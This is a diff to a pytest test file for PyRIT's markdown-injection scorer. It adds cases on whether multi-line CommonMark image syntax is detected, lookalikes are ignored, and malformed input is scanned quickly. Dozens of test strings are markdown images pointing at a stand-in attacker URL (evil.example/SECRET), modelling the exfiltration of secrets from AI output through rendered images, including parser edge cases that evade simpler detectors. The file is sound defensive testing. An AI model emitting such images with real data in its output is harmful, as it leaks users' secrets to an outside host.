@@ -8,6 +8,7 @@ import pytest
 from pyrit.memory import CentralMemory
 from pyrit.memory.memory_interface import MemoryInterface
 from pyrit.score import MarkdownInjectionScorer
+from pyrit.score.true_false.regex.markdown_injection import _find_images
 
 
 @pytest.mark.parametrize(
@@ -92,11 +93,160 @@ async def test_md_shortcut_reference_image_detected(text: str, patch_central_dat
         # A shortcut reference with no matching definition renders as literal text.
         "![logo]",
         "![logo]\n\n[other]: https://example.com/p.png",
+        # A blank line ends the paragraph.
+        "![not an\n\nimage](https://evil.example/SECRET/p.png)",
+        "![not an image](\n\nhttps://evil.example/SECRET/p.png)",
+        "![not an\n \t\nimage](https://evil.example/SECRET/p.png)",
+        "![not an\r\n\r\nimage](https://evil.example/SECRET/p.png)",
+        "![not\nan\r\rimage](https://evil.example/SECRET/p.png)",
+        "![note]\n\nSee [the docs](https://evil.example/SECRET/p.png)",
+        "![not an\n\nimage][r]\n\n[r]: https://evil.example/SECRET/p.png",
+        # Across lines, the image text ends at its "]" and the destination at the first space or
+        # line break, so a later link or stray text does not complete an image.
+        "![note]\nSee [the docs](https://evil.example/SECRET/p.png)",
+        "![note]\nSee [the docs][r]\n\n[r]: https://evil.example/SECRET/p.png",
+        "![logo](https://evil.example/SECRET/p.png\ntext)",
+        "![quarterly\nreport](<https://evil.example/SECRET/p.png)",
+        # A block start ends the paragraph, so the image text never reaches its "]".
+        "![a\n# b](https://evil.example/SECRET/p.png)",
+        "![a\n```\nb](https://evil.example/SECRET/p.png)",
+        "![a\n~~~\nb](https://evil.example/SECRET/p.png)",
+        "![a\n***\nb](https://evil.example/SECRET/p.png)",
+        "![a\n- b](https://evil.example/SECRET/p.png)",
+        "![a\n> b](https://evil.example/SECRET/p.png)",
+        "![a\n<div>\nb](https://evil.example/SECRET/p.png)",
+        "# ![a\nb](https://evil.example/SECRET/p.png)",
+        "1. ![a\n2. b](https://evil.example/SECRET/p.png)",
+        "> ![a\n> > b](https://evil.example/SECRET/p.png)",
+        "- ![a\n    # b](https://evil.example/SECRET/p.png)",
+        # A list marker outside the item's indentation starts a new item.
+        "- ![a\n2. b](https://evil.example/SECRET/p.png)",
+        # Code is not rendered as an image.
+        "```\n![a\nb](https://evil.example/SECRET/p.png)\n```",
+        "    ![a\n    b](https://evil.example/SECRET/p.png)",
+        "`![a\nb](https://evil.example/SECRET/p.png)`",
+        # A reference across lines needs a matching definition.
+        "![a\nb][missing]\n\n[other]: https://evil.example/SECRET/p.png",
+        "![a\nb][]",
+        # A shortcut label that spans lines still needs a matching definition.
+        "![quarterly\nreport]",
+        # A definition inside a code block is code, so the label renders literally.
+        "![a\nb]\n\n```\n[a b]: https://evil.example/SECRET/p.png\n```",
+        # HTML blocks are raw HTML, not Markdown.
+        "<!--\n![a\nb](https://evil.example/SECRET/p.png)\n-->",
+        "<script>\n![a\nb](https://evil.example/SECRET/p.png)\n</script>",
+        "<div>\n![a\nb](https://evil.example/SECRET/p.png)\n</div>",
     ],
 )
 async def test_md_image_lookalikes_not_detected(text: str, patch_central_database):
     scorer = MarkdownInjectionScorer()
     score = (await scorer.score_text_async(text))[0]
+    assert score.get_value() is False
+
+
+@pytest.mark.parametrize(
+    ("text", "pattern_name"),
+    [
+        # CommonMark lets link text, the space before the destination and the space before the
+        # title contain a line ending, so each of these still renders as an image.
+        ("![quarterly\nreport](https://evil.example/SECRET/p.png)", "Markdown Image (inline)"),
+        ("![logo](\nhttps://evil.example/SECRET/p.png)", "Markdown Image (inline)"),
+        ('![logo](https://evil.example/SECRET/p.png\n"Logo")', "Markdown Image (inline)"),
+        ("![quarterly\r\nreport](https://evil.example/SECRET/p.png)", "Markdown Image (inline)"),
+        ("![quarterly\nreport][r]\n\n[r]: https://evil.example/SECRET/p.png", "Markdown Image (reference)"),
+        ("![logo][my\nref]\n\n[my ref]: https://evil.example/SECRET/p.png", "Markdown Image (reference)"),
+        # Escaped and nested brackets stay inside the image text.
+        ("![a\\]\nb](https://evil.example/SECRET/p.png)", "Markdown Image (inline)"),
+        ("![a [b]\nc](https://evil.example/SECRET/p.png)", "Markdown Image (inline)"),
+        # Nested brackets have no depth limit.
+        ("![a [b [c [d]]]\ne](https://evil.example/SECRET/p.png)", "Markdown Image (inline)"),
+        ("![" + "[" * 50 + "a" + "]" * 50 + "\nb](https://evil.example/SECRET/p.png)", "Markdown Image (inline)"),
+        # Shortcut labels match after CommonMark collapses their whitespace and folds their case.
+        (
+            "![quarterly\nreport]\n\n[quarterly report]: https://evil.example/SECRET/p.png",
+            "Markdown Image (shortcut reference)",
+        ),
+        (
+            "![Quarterly  Report]\n\n[quarterly report]: https://evil.example/SECRET/p.png",
+            "Markdown Image (shortcut reference)",
+        ),
+        # Block quote continuation lines and list item continuation lines stay in the paragraph.
+        ("> ![quarterly\n> report](https://evil.example/SECRET/p.png)", "Markdown Image (inline)"),
+        ("- ![quarterly\n  report](https://evil.example/SECRET/p.png)", "Markdown Image (inline)"),
+        # Block quote markers are not part of the destination or the label.
+        ("> ![logo](\n> https://evil.example/SECRET/p.png)", "Markdown Image (inline)"),
+        (
+            "> ![quarterly\n> report]\n\n[quarterly report]: https://evil.example/SECRET/p.png",
+            "Markdown Image (shortcut reference)",
+        ),
+        # A definition inside a block quote is read without its quote markers.
+        (
+            "> ![a\n> b][r]\n>\n> [r]: https://evil.example/SECRET/p.png",
+            "Markdown Image (reference)",
+        ),
+        # A definition after lone CR line endings is still a definition.
+        (
+            "![quarterly\rreport]\r\r[quarterly report]: https://evil.example/SECRET/p.png",
+            "Markdown Image (shortcut reference)",
+        ),
+        # Inline HTML around an image does not start an HTML block.
+        ("<span>![a\nb](https://evil.example/SECRET/p.png)</span>", "Markdown Image (inline)"),
+        # A code fence ends with the block quote or list item that holds it.
+        ("> ```\n> code\n\n![quarterly\nreport](https://evil.example/SECRET/p.png)", "Markdown Image (inline)"),
+        ("- ```\n  code\n\n![quarterly\nreport](https://evil.example/SECRET/p.png)", "Markdown Image (inline)"),
+        # A bracket inside a code span is text.
+        ("![a `]` b\nc](https://evil.example/SECRET/p.png)", "Markdown Image (inline)"),
+        (
+            "![quarterly\nreport][]\n\n[quarterly report]: https://evil.example/SECRET/p.png",
+            "Markdown Image (reference)",
+        ),
+    ],
+)
+async def test_md_image_with_line_break_detected(text: str, pattern_name: str, patch_central_database):
+    scorer = MarkdownInjectionScorer()
+    score = (await scorer.score_text_async(text))[0]
+    assert score.get_value() is True
+    assert pattern_name in score.score_rationale
+
+
+@pytest.mark.parametrize(
+    ("patterns", "expected"),
+    [
+        # Custom patterns replace the defaults, so only a default image pattern follows images across lines.
+        ({"Custom": r"!\[.*?\]\(.*?\)"}, False),
+        ({"Markdown Image (inline)": MarkdownInjectionScorer._DEFAULT_PATTERNS["Markdown Image (inline)"]}, True),
+    ],
+)
+async def test_md_image_across_lines_follows_default_patterns_only(
+    patterns: dict[str, str], expected: bool, patch_central_database
+):
+    scorer = MarkdownInjectionScorer(patterns=patterns)
+    score = (await scorer.score_text_async("![quarterly\nreport](https://evil.example/SECRET/p.png)"))[0]
+    assert score.get_value() is expected
+
+
+@pytest.mark.timeout(10)
+@pytest.mark.parametrize(
+    "text",
+    [
+        # Many unclosed images across the lines of one paragraph.
+        "![a](b\n" * 20_000,
+        # Deeply nested and unbalanced brackets.
+        "![" * 50_000 + "a\n" + "]" * 50_000,
+        "![a" + "]" * 50_000 + "\n" + "[" * 50_000,
+        "![a\n" * 20_000 + "]",
+    ],
+    # Short ids: pytest copies the id into an environment variable, which Windows caps at 32,767 characters.
+    ids=["unclosed-inline-per-line", "nested-openers", "closers-then-openers", "unclosed-image-per-line"],
+)
+def test_md_image_scan_scales_on_malformed_input(text: str):
+    assert _find_images(text) == set()
+
+
+@pytest.mark.timeout(10)
+async def test_md_injection_scales_on_unclosed_images_across_lines(patch_central_database):
+    scorer = MarkdownInjectionScorer()
+    score = (await scorer.score_text_async("![a](b\n" * 20_000))[0]
     assert score.get_value() is False
 
 
